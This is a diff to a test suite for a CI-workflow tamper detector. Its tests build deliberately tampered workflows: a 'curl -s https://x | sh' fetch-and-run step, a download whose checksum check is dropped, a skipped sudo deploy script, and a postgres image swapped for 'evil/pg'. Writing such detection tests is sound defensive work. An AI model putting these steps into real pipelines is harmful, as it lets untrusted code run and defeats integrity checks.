@@ -207,6 +207,24 @@ describe('【故意造出的失败】碰到信任的每一类：都要抓到，�
     const tampered = ['      - run: pnpm install --frozen-lockfile && curl -s https://x | sh'];
     const got2 = await workflowDiff(job([...install, ...hygiene]), job([...tampered, ...hygiene]));
     expect((got2 as string[]).join('；')).toContain('先后变了');
+    // 【故意造出的失败】下载步骤把校验去掉、sudo 的命令改了、docker 起的镜像换了：都抓到
+    const dl = (verify: string) => [
+      '      - run: |',
+      '          curl -fsSL -o t.tgz https://example.test/t.tgz',
+      `          ${verify}`,
+    ];
+    const g3 = await workflowDiff(job(dl('echo "$SHA  t.tgz" | sha256sum -c -')), job(dl('true')));
+    expect((g3 as string[]).join('；')).toContain('先后变了');
+    const g4 = await workflowDiff(
+      job(['      - run: sudo bash deploy/test/run.sh']),
+      job(['      - run: sudo bash deploy/test/run.sh --skip']),
+    );
+    expect((g4 as string[]).join('；')).not.toEqual('');
+    const g5 = await workflowDiff(
+      job(['      - run: docker run -d postgres:16-alpine']),
+      job(['      - run: docker run -d evil/pg']),
+    );
+    expect((g5 as string[]).join('；')).toContain('先后变了');
   });
 
   it('真 ci.yml 上动一处权限、删一个 job：都抓到', async () => {
